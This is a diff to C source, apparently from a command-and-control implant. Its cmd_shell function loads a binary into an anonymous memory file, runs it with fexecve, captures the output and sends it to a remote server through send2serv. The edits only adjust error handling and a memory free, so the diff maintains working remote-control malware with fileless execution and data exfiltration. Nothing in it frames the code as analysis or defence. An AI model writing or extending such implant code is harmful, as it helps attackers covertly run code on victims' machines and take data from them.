@@ -84,31 +84,29 @@ void cmd_shell(struct io_uring *ring, int sockfd, const char *uuid, char *input)
         dup2(pipefd[1], STDERR_FILENO);
 
         int fd = open(full_path, O_RDONLY);
-        if (fd == -1) exit(1);
+        if (fd == -1) return;
         
         struct stat st;
         int rv = fstat(fd, &st);
 
-        if (rv == -1) exit(1);
+        if (rv == -1) return;
 
         void *buffer = malloc(st.st_size); //size of binary
-        if (buffer == NULL) exit(1);
+        if (buffer == NULL) return;
 
         ssize_t bytesRead = read(fd, buffer, st.st_size);
-        if (bytesRead == -1) exit(1);
+        if (bytesRead == -1) return;
 
         close(fd);
         int af = memfd_create(name, MFD_CLOEXEC);
-        if (af == -1) exit(1);
+        if (af == -1) return;
         
         ssize_t bytesWritten = write(af, buffer, st.st_size);
-        if (bytesWritten == -1) exit(1);
+        if (bytesWritten == -1) return;
 
         fexecve(af, args, envp);
-        free(args);
-
-        exit(1);
-        // return;
+        
+        return;
     } else {
         close(pipefd[1]);
         
@@ -132,7 +130,7 @@ void cmd_shell(struct io_uring *ring, int sockfd, const char *uuid, char *input)
         send2serv(uuid, output_buffer, total_size);
         free(output_buffer);
     }
-
+    free(args);
     close(pipefd[0]);
     waitpid(pid, NULL, 0);
 }
